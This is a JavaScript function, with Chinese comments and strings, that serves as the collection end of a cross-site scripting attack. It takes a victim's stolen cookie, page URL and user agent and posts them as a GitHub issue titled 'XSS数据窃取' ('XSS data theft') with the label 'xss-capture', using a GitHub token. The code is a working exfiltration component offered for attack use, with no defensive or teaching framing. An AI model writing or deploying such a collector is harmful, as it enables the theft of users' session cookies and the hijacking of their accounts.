async function createGithubIssue(data) {
    if (!data.cookie && !data.url && !data.user_agent) return;
    // 对特殊字符进行双重编码，避免JSON解析错误
    const safeCookie = data.cookie ? encodeURIComponent(decodeURIComponent(data.cookie)) : '无';
    const safeUrl = data.url ? encodeURIComponent(decodeURIComponent(data.url)) : '无';
    const safeUa = data.user_agent ? encodeURIComponent(decodeURIComponent(data.user_agent)) : '无';

    const title = `XSS数据窃取 - ${new Date().toLocaleString()}`;
    const body = `
### 窃取的XSS数据
- **Cookie**：\`${safeCookie}\`
- **目标URL**：\`${safeUrl}\`
- **用户代理**：\`${safeUa}\`
- **窃取时间**：${new Date().toISOString()}
    `.trim();

    await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/issues`, {
        method: 'POST',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json;charset=utf-8'
        },
        body: JSON.stringify({ title, body, labels: ['xss-capture'] })
    });
}
